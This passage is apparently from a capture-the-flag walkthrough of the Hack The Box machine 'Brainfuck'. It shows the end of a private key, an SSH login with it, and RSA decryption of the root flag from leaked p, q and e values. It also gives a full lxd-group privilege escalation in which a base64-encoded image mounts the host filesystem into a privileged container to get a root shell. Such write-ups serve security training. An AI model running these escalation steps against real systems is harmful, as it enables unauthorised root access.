wgwbnlfyLo7MKoqFf+iNJ+ybU/re68UMaoostme9yUUCgYEAuRus8RIz32heP1+0
WxmWn53EDm5BEuVu9yhPlqxeE/+3Gq/JSB7fRB/ymGhyMmTjr0oLnCpCK0/JCS0z
pc8VX8rtM1TNUWcbysG3+YmCpTPIuCZ6trZfICsckuFmjDM/ewn27cPMwv/nqg0t
6UuoHUr8lx346otC2PrOWSs4vYc=
-----END PRIVATE KEY-----
```

Let's check if I can open a ssh connection using this key.

```bash
┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ ssh -i id_rsa.priv orestis@brainfuck.htb
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


You have mail.
Last login: Mon Oct  3 19:41:38 2022 from 10.10.14.23
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
orestis@brainfuck:~$ whoami
orestis
```

I got a shell of `orestis`!



# Just to read root flag

### Decrypt RSA encryption

```python
orestis@brainfuck:~$ ls
debug.txt  encrypt.sage  mail  output.txt  user.txt
orestis@brainfuck:~$ cat output.txt
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182

orestis@brainfuck:~$ cat debug.txt
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997

orestis@brainfuck:~$ cat encrypt.sage 
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)

c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

- `ecrypt.sage` : Python code to make encryption.
- `debug.txt` : Stores `p`, `q`, `e` value.
- `output.txt` : Stores encrypted password.

Here's the link for the code snippet to decrypt with given `p`, `q`, `e` value:
https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e

Given the reference, I built a code.

```bash
┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ cat decrypt.py 
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()
```

When I ran it, I got a decrypted text.

```ruby
┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ python decrypt.py
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
```

Then, in reverse order, I can decrypt `root.txt`.

```python
>>> pt = 24604052029401386049980296953784287079059245867880966944246662849341507003750
>>> hex(pt)
'0x3665666331613564626238393034373531636536353636613330356262386566'
>>> bytes.fromhex(str(hex(pt))[2:]).decode('utf-8')
'6efc1a5dbb8904751ce6566a305bb8ef'
```



# Alternative to get `root` shell

### LXC container Privilege Escalation

The current user `orestis` belongs to `lxd` group.

```bash
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
```

And this might be useful to privesc as follows :
https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1
There are many resources and references for privesc, but this one is more suitable for the case when it's more limited.

The following is the whole required walkthrough for the exploit.

```bash
bob:~$ echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2
bob:~$ lxc image import bob.tar.bz2 --alias bobImage
Image imported with fingerprint: 8961bb8704bc3fd43269c88f8103cab4fccd55325dd45f98e3ec7c75e501051d
bob:~$ lxc init bobImage bobVM -c security.privileged=true
Creating bobVM
bob:~$ lxc config device add bobVM realRoot disk source=/ path=r
Device realRoot added to bobVM
bob:~$ lxc start bobVM
bob:~$ lxc exec bobVM -- /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cat /r/root/root.txt 
6efc1a5dbb8904751ce6566a305bb8ef
```

Then I got a `root` shell!
I can easily prepending `/r/` for fetching the host system's directory.